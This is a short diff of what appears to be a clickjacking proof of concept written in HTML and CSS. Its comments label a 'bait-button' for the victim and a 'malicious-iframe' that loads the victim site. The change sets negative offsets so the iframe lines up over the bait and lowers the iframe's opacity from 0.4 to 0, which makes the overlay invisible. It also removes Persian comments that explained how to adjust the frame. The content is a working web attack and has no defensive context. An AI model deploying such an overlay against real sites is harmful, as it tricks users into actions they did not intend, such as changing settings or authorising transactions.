@@ -25,8 +25,8 @@
         /* The innocent-looking button the victim wants to click */
         .bait-button {
             position: absolute;
-            top: 319px;
-            left: 292px;
+            top: 175px;
+            left: 220px;
             width: 200px;
             height: 50px;
             background-color: #22c55e;
@@ -42,18 +42,13 @@
         /* The malicious iframe loading the victim site */
         .malicious-iframe {
             position: absolute;
-
-            /* ۱. فریم را بسیار بزرگ می‌کنیم تا کل صفحه قربانی رندر شود و به هم نریزد */
             width: 1200px;
             height: 1500px;
-
-            /* ۲. با مقادیر منفی، فریم را به بالا و چپ هول می‌دهیم (مانند یک اسکرول مخفی) */
-            top: -500px; /* این عدد را تغییر دهید تا صفحه به بالا/پایین حرکت کند */
-            left: -100px; /* این عدد را تغییر دهید تا صفحه به چپ/راست حرکت کند */
-
+            top: -404px;
+            left: -580px;
             border: none;
             z-index: 2;
-            opacity: 0.4;
+            opacity: 0;
         }
     </style>
 </head>
